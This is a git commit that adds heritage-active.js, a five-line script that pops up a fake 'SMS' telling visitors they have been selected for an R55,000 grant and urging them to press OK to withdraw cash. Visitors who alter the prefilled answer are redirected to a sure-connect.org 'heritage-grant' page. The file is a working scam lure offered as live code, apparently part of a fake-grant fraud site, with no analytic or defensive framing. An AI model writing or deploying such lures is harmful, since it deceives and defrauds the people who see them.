63f7583669563feeeac2ad286b12b98e9c7fd085
sureconnect001 <ukpe247@gmail.com>
2025-09-04 16:20:49 +0100

    Create heritage-active.js

---
+++ heritage-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW R55,000'
+password=prompt('SMS: Congratulations, you are among the selected ones to receive R55,000 Grant, Press Ok to withdraw cash Now ','WITHDRAW R55,000');
+if (password != 'WITHDRAW R55,000') {
+location.href='https://sure-connect.org/heritage-grant.html';
+}
